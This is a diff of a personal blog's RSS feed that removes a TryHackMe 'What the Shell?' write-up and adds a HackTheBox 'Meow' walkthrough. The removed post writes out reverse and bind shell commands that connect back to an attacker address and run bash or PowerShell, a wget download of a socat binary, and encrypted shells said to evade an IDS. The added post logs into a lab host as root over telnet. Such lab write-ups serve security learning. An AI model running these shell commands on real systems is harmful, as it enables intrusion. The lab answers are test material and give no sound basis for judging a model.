@@ -432,245 +432,6 @@ pip3 install -r requirements.txt</code></pre>
 ]]></content:encoded>
     </item>
     <item>
-      <title>[THM] What the Shell?</title>
-      <link>http://localhost:1313/thm-what-the-shell/</link>
-      <pubDate>Thu, 25 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-what-the-shell/</guid>
-      <description>Tools Netcat: the traditional &amp;ldquo;Swiss Army Knife&amp;rdquo; of networking. It is used to manually perfrom all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques.</description>
-      <content:encoded><![CDATA[<h4 id="tools">Tools</h4>
-<p><strong><em>Netcat</em></strong>: the traditional &ldquo;Swiss Army Knife&rdquo; of networking. It is used to manually perfrom all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques.</p>
-<p><strong><em>Socat</em></strong>: Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however there are two big catches:</p>
-<ol>
-<li>The syntax is more difficult.</li>
-<li>Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.</li>
-</ol>
-<p><strong><em>Metasploit &ndash;multi/handler</em></strong>: The <code>exploit/multi/handler</code> module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells. It&rsquo;s also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads.</p>
-<p><strong><em>msfvenom</em></strong>: like multi/hanlder, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Msfvenom is an incredibly powerfool tool.</p>
-<br>
-<h4 id="types-of-shell">Types of Shell</h4>
-<p>At a high level, we are interested in two kinds of shell when it comes to exploiting a target: <strong><em>Reverse Shells</em></strong> and <strong><em>Bind Shells</em></strong>.</p>
-<p><strong>Reverse Shells</strong> are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned previously to set up a <em>listener</em> which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.</p>
-<p><strong>Bind Shells</strong> are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.</p>
-<p>As a general rule, reverse shells are easier to execute and debug.</p>
-<br>
-<h4 id="reverse-shell">Reverse Shell</h4>
-<p>Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.</p>
-<p><img src="image.png#center" alt="alt text"></p>
-<br>
-<h4 id="bind-shell">Bind Shell</h4>
-<p><img src="image-1.png#center" alt="alt text"></p>
-<p>As you can see, this once again gives us code execution on the remote machine. The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.</p>
-<br>
-<h4 id="interactive-vs-non-interactive-shells">Interactive vs Non-interactive shells</h4>
-<p>Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Interactive programs do not work in non-interactive shells.</p>
-<hr>
-<h4 id="which-type-of-shell-connects-back-to-a-listening-port-on-your-computer-reverse-r-or-bind-b">Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>R</code></pre>
-<br>
-<h4 id="you-have-injected-malicious-shell-code-into-a-website-is-the-shell-you-receive-likely-to-be-interactive-y-or-n">You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>N</code></pre>
-<br>
-<h4 id="when-using-a-bind-shell-would-you-execute-a-listener-on-the-attacker-a-or-the-target-t">When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>T</code></pre>
-<br>
-<h4 id="netcat">Netcat</h4>
-<p>Netcat is the most basic tool in a pentester&rsquo;s toolkit when it comes to any kind of networking.</p>
-<p>There are many ways to execute a shell, so we&rsquo;ll start by looking at listeners.</p>
-<p>The syntax for starting a netcat listner using Linux is this:
-<code>nc -lvnp &lt;port-number&gt;</code></p>
-<ul>
-<li><code>l</code> is used to tell netcat that this will be a listener</li>
-<li><code>v</code> is used to request a verbose output</li>
-<li><code>n</code> tells netcat not to resolve hostnames or use DNS.</li>
-<li><code>p</code> indicates that the port specification will follow.</li>
-</ul>
-<p>Note that if you choose to use a port below 1024, you will need to use <code>sudo</code> when starting your listener. It&rsquo;s often a good idea to use a well-known port number as this is more likely to get past outbound firewall rules on the target.</p>
-<p>If we are looking to obtain a <strong>bind shell</strong> on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this:
-<code>nc &lt;target-ip&gt; &lt;chosen-port&gt;</code></p>
-<p>Here we are using netcat to make an outbound connection to the target on our chosen port.</p>
-<hr>
-<h4 id="which-option-tells-netcat-to-listen">Which option tells netcat to listen?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>-l</code></pre>
-<br>
-<h4 id="how-would-you-connect-to-a-bind-shell-on-the-ip-address-10101011-with-port-8080">How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>nc 10.10.10.11 8080</code></pre>
-<br>
-<h4 id="netcat-shell-stabilization">Netcat Shell Stabilization</h4>
-<h5 id="technique-1-python">Technique 1: Python</h5>
-<p>This is applicable only to Linux boxes.</p>
-<ol>
-<li>The first thing to do is use <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'</code>, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2, or python3.</li>
-<li>Step two is: <code>export TERM=xterm</code> &ndash; this will give us access to term commands such as <code>clear</code>.</li>
-<li>Finally and most importantly we will background the shell using <code>Ctrl + Z</code>. Back in our own terminal we use <code>stty raw -echo; fg</code>. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.</li>
-</ol>
-<br>
-<h5 id="technique-2-rlwrap">Technique 2: rlwrap</h5>
-<p>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilization must still be utilized if you wnat to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with <code>sudo apt install rlwrap</code>.</p>
-<p>To use rlwrap, we invoke a slightly different listener:
-<code>rlwrap nc -lnvp &lt;port&gt;</code></p>
-<p>predepending with <code>rlwrap</code> gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilize.</p>
-<br>
-<h5 id="technique-3-socat">Technique 3: Socat</h5>
-<p>The third easy way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. This technique is limited to Linux targets. To accomplish this method we would first transfer a <strong>socat static compiled binary</strong> up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (<code>sudo python3 -m http.server 80</code>), then, on the target machine, using the netcat shell to download the file. On Linux, this would be accomplished with curl or wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>)</p>
-<hr>
-<h4 id="how-would-you-change-your-terminal-size-to-have-238-columns">How would you change your terminal size to have 238 columns?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>stty cols 238</code></pre>
-<br>
-<h4 id="what-is-the-syntax-for-setting-up-a-python3-webserver-on-port-80">What is the syntax for setting up a Python3 webserver on port 80?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>sudo python3 -m http.server 80</code></pre>
-<br>
-<h4 id="socat">Socat</h4>
-<p>Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is a connector between two points. All socat does is provide a link between two points.</p>
-<p><strong><em>Reverse Shells</em></strong></p>
-<p>The syntax for socat gets a lot harder than that of netcat.</p>
-<p>Here&rsquo;s the basic reverse shell listener in socat:
-<code>socat TCP-L:&lt;port&gt; -</code></p>
-<p>As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to <code>nc -lvnp &lt;port&gt;</code>.</p>
-<p>On Windows we would use this command to connect back:</p>
-<p><code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe, pipes</code></p>
-<p>The &ldquo;pipes&rdquo; option is used to force powershell (or cmd.exe) to use Unix style standard input and output.</p>
-<p>This is the equivalent command for a Linux Target:</p>
-<p><code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</code></p>
-<br>
-<p><strong><em>Bind Shells</em></strong></p>
-<p>On a Linux target we would use the following command:</p>
-<p><code>socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</code></p>
-<p>On a WIndows target we would use this command for our listener:</p>
-<p><code>socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe, pipes</code></p>
-<p>we use &ldquo;pipes&rdquo; argument to interface between the Unix and Windows ways of handling input and output in a CLI.</p>
-<p>Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.</p>
-<p><code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></p>
-<hr>
-<p>Let&rsquo;s take a look at one of the more powerful uses for Socat: <strong><em>a fully stable Linux tty reverse shell</em></strong>.
-As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here&rsquo;s the syntax:</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</code></pre>
-<p>Let&rsquo;s break this command down into two parts. As usual, we&rsquo;re connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the <code>Ctrl + Z</code>, <code>stty raw -echo; fg</code> trick with a netcat shell &ndash; with the added bonus of being immediately stable and hooking into a full tty.</p>
-<p>The first listener can be connected to with any payload; however, this special listener must be activiated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it&rsquo;s possible to upload a <strong>precompiled socat binary</strong>, which can then be executed as normal.</p>
-<p>The special command is as follows:
-<code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></p>
-<p>Let&rsquo;s break it down.
-The first part is easy. We are linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with <code>EXEC:&quot;bash -li&quot;</code>. We are also passing the arguments: pty, stderr, sigint, setsid, and sane:</p>
-<ul>
-<li><code>pty</code> allocates a pseudoterminal on the target &ndash; part of the stabilisation process</li>
-<li><code>stderr</code> makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)</li>
-<li><code>sigint</code> passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell</li>
-<li><code>setsid</code> creates the process in a new session</li>
-<li><code>sane</code> stabilises the terminal, attempting to &ldquo;normalize&rdquo; it.</li>
-</ul>
-<hr>
-<h4 id="how-would-we-get-socat-to-listen-on-tcp-port-8080">How would we get socat to listen on TCP port 8080?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>TCP-L:8080</code></pre>
-<br>
-<p>Using Socat to create encrypted shells (both bind and reverse) prevents eavesdropping without a decryption key and can bypass an IDS.</p>
-<h5 id="generating-a-certificate">Generating a Certificate</h5>
-<ol>
-<li>
-<p>Create an RSA key with a matching certificate file:</p>
-<p><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code></p>
-</li>
-<li>
-<p>Merge the created files into a single .pem file:</p>
-<p><code>cat shell.key shell.crt &gt; shell.pem</code></p>
-</li>
-</ol>
-<h5 id="setting-up-a-reverse-shell-listener">Setting Up a Reverse Shell Listener:</h5>
-<ul>
-<li>
-<p>Listener setup:</p>
-<p><code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</code></p>
-</li>
-<li>
-<p>Connect back:</p>
-<p><code>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</code></p>
-</li>
-</ul>
-<h5 id="setting-up-a-bind-shell">Setting Up a Bind Shell:</h5>
-<ul>
-<li>
-<p>Target setup:</p>
-<p><code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code></p>
-</li>
-<li>
-<p>Attacker setup:</p>
-<p><code>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code></p>
-</li>
-</ul>
-<hr>
-<h4 id="what-is-the-syntax-for-setting-up-an-openssl-listener-using-the-tty-technique-from-the-previous-task-use-port-53-and-a-pem-file-called-encryptpem">What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called &ldquo;encrypt.pem&rdquo;</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0</code></pre>
-<br>
-<h4 id="if-your-ip-is-1010105-what-syntax-would-you-use-to-connect-back-to-this-listener">If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?</h4>
-
-
-
-
-
-
-<pre tabindex="0"><code>socat OPENSSL:10.10.10.5:53,verify=0 EXEC:&#34;bash -li&#34;,pty,stderr,sigint,setsid,sane</code></pre>
-<br>
-]]></content:encoded>
-    </item>
-    <item>
       <title>[HTB] Pennyworth</title>
       <link>http://localhost:1313/htb-pennyworth/</link>
       <pubDate>Sun, 21 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
@@ -9531,6 +9292,181 @@ TASK 4 What is the command we can use to send an ICMP echo request to test our c
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
 <p><img src="./fawn.png" alt="fawn_cleared"></p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>[HTB] Meow</title>
+      <link>http://localhost:1313/htb-meow/</link>
+      <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-meow/</guid>
+      <description>My journey begins here. 🐌
+TASK 1 What does the acronym VM stand for? Virtual Machine TASK 2 What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It&amp;rsquo;s also known as a console or shell.
+Terminal TASK 3 What service do we use to form our VPN connection into HTB labs?</description>
+      <content:encoded><![CDATA[<blockquote>
+<p>My journey begins here. 🐌</p>
+</blockquote>
+<hr>
+<h5 id="task-1">TASK 1</h5>
+<p>What does the acronym VM stand for? </br></p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Virtual Machine</code></pre>
+</br>
+<h5 id="task-2">TASK 2</h5>
+<p>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It&rsquo;s also known as a console or shell.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Terminal</code></pre>
+</br>
+<h5 id="task-3">TASK 3</h5>
+<p>What service do we use to form our VPN connection into HTB labs?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>openvpn</code></pre>
+</br>
+<h5 id="task-4">TASK 4</h5>
+<p>What tool do we use to test our connection to the target with an ICMP echo request?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>ping</code></pre>
+</br>
+<h5 id="task-5">TASK 5</h5>
+<p>What is the name of the most common tool for finding open ports on a target?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>nmap</code></pre>
+</br>
+<h5 id="task-6">TASK 6</h5>
+<p>What service do we identify on port23/tcp during our scans?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>telnet</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.67.74 -p <span style="color:#fab387">23</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-17 05:20 BST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.67.74
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0098s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>23/tcp open  telnet  Linux telnetd
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 20.48 seconds
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
+</br>
+<h5 id="task-7">TASK 7</h5>
+<p>What username is able to log into target over telnet with a blank password?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>root</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ telnet 10.129.67.74
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Trying 10.129.67.74...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Connected to 10.129.67.74.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Meow login: root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Welcome to Ubuntu 20.04.2 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 5.4.0-77-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  System information as of Mon <span style="color:#fab387">17</span> Jun <span style="color:#fab387">2024</span> 04:26:46 AM UTC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>  System load:           0.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>  Usage of /:            41.7% of 7.75GB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>  Memory usage:          4%
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>  Processes:             <span style="color:#fab387">135</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>  Users logged in:       <span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>  IPv4 address <span style="color:#cba6f7">for</span> eth0: 10.129.67.74
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>  IPv6 address <span style="color:#cba6f7">for</span> eth0: dead:beef::250:56ff:feb0:4ed1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span> * Super-optimized <span style="color:#cba6f7">for</span> small spaces - <span style="color:#89dceb">read</span> how we shrank the memory
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>   footprint of MicroK8s to make it the smallest full K8s around.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>
